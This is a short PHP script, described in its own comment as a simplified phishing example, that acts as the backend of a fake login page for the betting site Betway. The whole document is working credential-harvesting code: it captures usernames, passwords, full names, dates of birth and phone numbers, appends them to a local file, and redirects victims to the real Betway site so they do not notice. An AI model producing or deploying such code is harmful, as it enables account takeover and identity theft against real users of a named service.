<?php
// This is a simplified example - real phishing operations would be more sophisticated
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    $fullname = $_POST["fullname"];
    $dob = $_POST["dob"];
    $phone = $_POST["phone"];
    
    // Store collected data
    $data = "Username: " . $username . "\nPassword: " . $password . "\nName: " . $fullname . "\nDOB: " . $dob . "\nPhone: " . $phone . "\n\n";
    file_put_contents("collected_data.txt", $data, FILE_APPEND);
    
    // Redirect to the real Betway site to avoid suspicion
    header("Location: https://www.betway.com");
    exit();
}
?>
